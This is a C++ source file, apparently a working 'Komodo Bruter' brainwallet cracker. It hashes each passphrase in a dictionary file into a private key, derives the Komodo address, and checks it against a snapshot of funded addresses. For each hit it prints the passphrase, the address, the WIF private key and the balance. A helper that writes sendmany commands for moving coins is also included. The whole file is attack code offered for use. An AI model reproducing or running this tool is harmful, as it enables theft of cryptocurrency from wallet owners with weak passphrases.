/***
 *
 *  Komodo Bruter (c) Decker, 2020-2024
 *
*/

#include <iostream>
#include <stdint.h>
#include <map>
#include <set>
#include <algorithm>
#include <functional>
#include <unordered_set>

#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/reader.h"
#include "rapidjson/filereadstream.h"

#include "utilstrencodings.h"
#include "tinyformat.h"

#include <fstream>
#include <chrono>
#include "csv.h"
#include <thread>
#include <atomic>

static std::atomic<int> passwords_tried(0);

using namespace rapidjson;

#include <bitcoin/system.hpp>
// using namespace libbitcoin::system;

/* changeable params */
static const std::size_t MAX_SENDMANY_OUTPUTS = 10;
static const bool useExtendedScript = false;
static const std::set<std::string> setExcludeAddresses = {
    "RBatmanSuperManPaddingtonBearpcCTt",
    };

/* below is no user changeable params */
typedef int64_t CAmount;
typedef std::pair<std::string, CAmount> CBalanceRecord;
typedef std::vector< CBalanceRecord > CSendManyOutput;

static const CAmount COIN = 100000000;
static const CAmount CENT = 1000000;

static const CAmount MAX_MONEY = 200000000 * COIN; //21000000 * COIN;

static const std::string CL_GREEN = "\x1b[01;32m";
static const std::string CL_NORMAL = "\x1B[0m";
static const std::string CL_YELLOW = "\x1b[01;33m";

inline bool MoneyRange(const CAmount& nValue) { return (nValue >= 0 && nValue <= MAX_MONEY); }

int64_t AmountFromValue(const rapidjson::Value &value)
{
    if (!value.IsString()) throw std::runtime_error("Amount is not string");
    CAmount amount;
    if (!ParseFixedPoint(value.GetString(), 8, &amount)) throw std::runtime_error("Invalid amount");
    if (!MoneyRange(amount)) throw std::runtime_error("Amount out of range");
    return amount;
}

std::string ValueFromAmount(const CAmount& amount)
{
    bool sign = amount < 0;
    int64_t n_abs = (sign ? -amount : amount);
    int64_t quotient = n_abs / COIN;
    int64_t remainder = n_abs % COIN;
    return strprintf("%s%d.%08d", sign ? "-" : "", quotient, remainder);
}

void PrintSendManyCli(std::ostream& ostr, const CSendManyOutput &vec, int64_t txcount, bool fProduceScriptEx = false)
{
    static const int64_t confirmations = 0;
    if (vec.size() > 0) {
        if (fProduceScriptEx) {
            ostr << "while true; do" << std::endl << "echo -e \"Executing tx \x1b[01;32m#"<< txcount << "\x1B[0m ... \"" << std::endl;
        }
        ostr << "./komodo-cli -ac_name=VOTE2020 sendmany \"\" \"{";
        for (CSendManyOutput::const_iterator iter = vec.begin(); iter != vec.end(); ++iter)
	    {
            if ((*iter).second > 0)
                ostr << "\\\"" << (*iter).first << "\\\":\\\"" << ValueFromAmount((*iter).second) << "\\\"" << ((std::distance( iter, vec.end() ) != 1) ? "," : "");
        }
        ostr << "}\" " << confirmations << " \"tx." << txcount << "\"" << std::endl;
        if (fProduceScriptEx) {
            ostr << "    if [ $? -eq 0 ]; then" << std::endl;
            ostr << "    break" << std::endl;
            ostr << "    fi" << std::endl;
            ostr << "    sleep 1" << std::endl;
            ostr << "done" << std::endl;
            ostr << std::endl;
        }
    }
}

// https://stackoverflow.com/questions/216823/whats-the-best-way-to-trim-stdstring
// trim from end (in place)
static inline void rtrim(std::string &s) {
    s.erase(std::find_if(s.rbegin(), s.rend(), [](int ch) {
        return !std::isspace(ch);
    }).base(), s.end());
}

int main()
{

    std::mutex g_display_mutex;
    std::map<std::string, int64_t> mapBalances;

    Document d;
    // Prepare JSON reader and input stream.
    FILE *fp = fopen("snapshot.json", "r");
    if (!fp) {
        std::cerr << "Can't find snapshot.json. Exiting." << std::endl;
        return -1;
    }
    
    Reader reader;
    char readBuffer[65536];
    FileReadStream is(fp /*stdin*/, readBuffer, sizeof(readBuffer));

    if (d.ParseStream(is).HasParseError()) {
        std::cerr << "JSON parse error. Exiting." << std::endl;
        fclose(fp);
        return -1;
    }

    int64_t totalAddressesInJson = 0;
    if (d.HasMember("addresses") && d["addresses"].IsArray()) {
        const Value& a = d["addresses"];
        totalAddressesInJson = a.Size();
        std::cerr << "Parsing " << totalAddressesInJson << " adresses - ";
        for (SizeType i = 0; i < totalAddressesInJson; i++) {
            if (a[i].IsObject()) {
                const Value& el = a[i];
                if (el.HasMember("addr") && el.HasMember("amount")) {
                    // std::cout << el["addr"].GetString() << std::endl;
                    if (el["addr"].IsString() && el["amount"].IsString()) {
                        mapBalances[el["addr"].GetString()] = AmountFromValue(el["amount"]);
                    }
                }
            }
        }

    }

    if (totalAddressesInJson != mapBalances.size()) {
        std::cerr << "only " << mapBalances.size() << " valid! Exiting." << std::endl;
        return -1;
    }

    std::cerr << "Ok!" << std::endl;
    
    // io::CSVReader<2, io::trim_chars<' '>, io::no_quote_escape<';'>> in("utxodump.csv");
    // std::string zec_addr; CAmount z_balance;
    // while(in.read_row(zec_addr, z_balance))
    // {
    //     mapBalances[zec_addr] = z_balance;
    // }

    // https://stackoverflow.com/questions/7868936/read-file-line-by-line-using-ifstream-in-c
    std::ifstream input( "dict.txt" );
    // std::set<std::string> setPasswords;
    // std::vector<std::string> setPasswords;
    std::unordered_set<std::string> setPasswords;
    
    {
        // read dictionary
        auto start = std::chrono::steady_clock::now();
        for( std::string line; getline( input, line ); )
        {
            //rtrim(line);
            setPasswords.insert(line);
            // setPasswords.push_back(line);
        }
        auto end = std::chrono::steady_clock::now();

        std::cerr << "Total passwords: " << setPasswords.size()
            << " (" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms)" << std::endl;
    }

    auto worker = [&setPasswords, &mapBalances, &g_display_mutex] (std::unordered_set<std::string>::iterator it_begin, std::unordered_set<std::string>::iterator it_end) {

        int64_t n = 0;
        auto start = std::chrono::steady_clock::now();

        libbitcoin::system::ec_secret privkey;
        libbitcoin::system::ec_compressed pubkey;
        libbitcoin::system::one_byte addr_prefix;
        libbitcoin::system::data_array<2> two_byte_addr_prefix;
        libbitcoin::system::data_chunk prefix_pubkey_checksum;
        std::string kmd_addr;

        for (std::unordered_set<std::string>::iterator iter = it_begin; iter != it_end; ++iter) 
        {

            std::string passphrase = *iter;

            std::vector<char> passphrase_bytes(passphrase.begin(), passphrase.end());
            auto passphrase_data_slice = libbitcoin::system::data_slice((const uint8_t *)passphrase_bytes.data(),(const uint8_t *)(passphrase_bytes.data() + passphrase_bytes.size()));
            auto sha256sum = libbitcoin::system::sha256_hash(passphrase_data_slice);

            sha256sum[0]  = sha256sum[0] & 248;
            sha256sum[31] = sha256sum[31] & 127;
            sha256sum[31] = sha256sum[31] | 64;

            // auto sha256sum = libbitcoin::system::sha256_hash(sha256sum_pre);


            //auto sha256sum_hex = encode_base16(sha256sum);
            //std::cerr << passphrase << " - " << sha256sum_hex << std::endl;
            //decode_base16(privkey, sha256sum_hex);
            //secret_to_public(pubkey, privkey);
            privkey = sha256sum;

            libbitcoin::system::secret_to_public(pubkey,privkey);
            std::string pubkeyhex_str = libbitcoin::system::encode_base16(pubkey);

            // Pubkeyhash: sha256 + hash160
            auto my_pubkeyhash = libbitcoin::system::bitcoin_short_hash(pubkey);

            addr_prefix = { { 60 } };
            two_byte_addr_prefix = {{0x1c, 0xb8}};
            // Byte sequence = prefix + pubkey + checksum(4-bytes)
            prefix_pubkey_checksum = libbitcoin::system::to_chunk(addr_prefix);
            libbitcoin::system::extend(prefix_pubkey_checksum, my_pubkeyhash);
            libbitcoin::system::append_checksum(prefix_pubkey_checksum);
            // Base58 encode byte sequence -> Bitcoin Address
            kmd_addr = libbitcoin::system::encode_base58(prefix_pubkey_checksum);
            // std::cout << kmd_addr << std::endl;

            if (n % 500000 == 0) {
                auto end = std::chrono::steady_clock::now();
                g_display_mutex.lock();
                std::cerr << "[" << passwords_tried.load() << "/" << setPasswords.size() << "] "
                    << "" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms" << std::endl;
                // std::cerr << "mapBalances.size() = " << mapBalances.size() << std::endl;
                g_display_mutex.unlock();
                start = end;
            }


            // if (mapBalances[kmd_addr] != 0) // (!) never use std::map [] construction for reading, it creates element in map (!)
            auto it = mapBalances.find(kmd_addr);
            if ( it != mapBalances.end())
            {
                libbitcoin::system::one_byte secret_prefix = { { 188 /*128*/ } };
                libbitcoin::system::one_byte secret_compressed = { { 0x01 } }; // omitted if uncompressed
                // Apply prefix, suffix & append checksum
                auto prefix_secret_comp_checksum = libbitcoin::system::to_chunk(secret_prefix);
                libbitcoin::system::extend(prefix_secret_comp_checksum, privkey);
                libbitcoin::system::extend(prefix_secret_comp_checksum, secret_compressed);
                libbitcoin::system::append_checksum(prefix_secret_comp_checksum);

                std::string kmd_wif = libbitcoin::system::encode_base58(prefix_secret_comp_checksum);
                std::thread::id this_id = std::this_thread::get_id();
                g_display_mutex.lock();
                // [" << strprintf("0x%08x", this_id) << "," << std::distance(it_begin, iter) << "]""
                if ((*it).second > 10 * COIN) 
                    std::cout << "'" << passphrase << "' - " << kmd_addr << " (" << kmd_wif << ") - " << CL_YELLOW << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
                else 
                    std::cout << "'" << passphrase << "' - " << kmd_addr << " (" << kmd_wif << ") - " << CL_GREEN << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
                g_display_mutex.unlock();
            }

            n++;
            passwords_tried.fetch_add(1);
        }
    };
    
    // https://stackoverflow.com/questions/10792157/c-2011-stdthread-simple-example-to-parallelize-a-loop
    // https://blog.devgenius.io/a-simple-guide-to-atomics-in-c-670fc4842c8b
    // https://stackoverflow.com/questions/36997584/no-match-for-operator-aka-std-rb-tree-const-iterator-stdmap

    // serial
    // worker(std::begin(setPasswords), std::end(setPasswords));
    // std::cout << std::accumulate(std::begin(setPasswords), std::end(setPasswords), 0) << std::endl;

    // int count = std::count(setPasswords.begin(), setPasswords.end(), "as");
    // std::cout << "Number of occurrences of 'as': " << count << std::endl;

    // Determine the number of threads to use
    const unsigned int max_threads = std::thread::hardware_concurrency();
    // Fallback to 4 threads if hardware_concurrency can't determine
    const unsigned int num_threads = max_threads > 0 ? max_threads : 4;
    std::cerr << "Threads: " << num_threads << std::endl;

     // Prepare a vector to hold thread objects
    std::vector<std::thread> threads;
    threads.reserve(num_threads);

    size_t total = setPasswords.size();
    size_t grainsize = total / max_threads;
    size_t remainder = total % max_threads;

    auto work_iter = setPasswords.begin();

    for(int i = 0; i < num_threads; ++i) {
        // Calculate the start and end for each thread
        auto start_iter = work_iter;
        size_t current_grainsize = grainsize + (i < remainder ? 1 : 0); // Distribute the remainder
        std::advance(work_iter, current_grainsize);
        auto end_iter = work_iter;

        // Launch the thread with its specific range
        threads.emplace_back(worker, start_iter, end_iter);
    }

    // Join all threads to ensure completion before exiting the function
    for(auto& thread : threads) {
        if(thread.joinable()) {
            thread.join();
        }
    }

    // std::cout << std::accumulate(std::begin(setPasswords), std::end(setPasswords), 0) << std::endl;
    return 0;
}
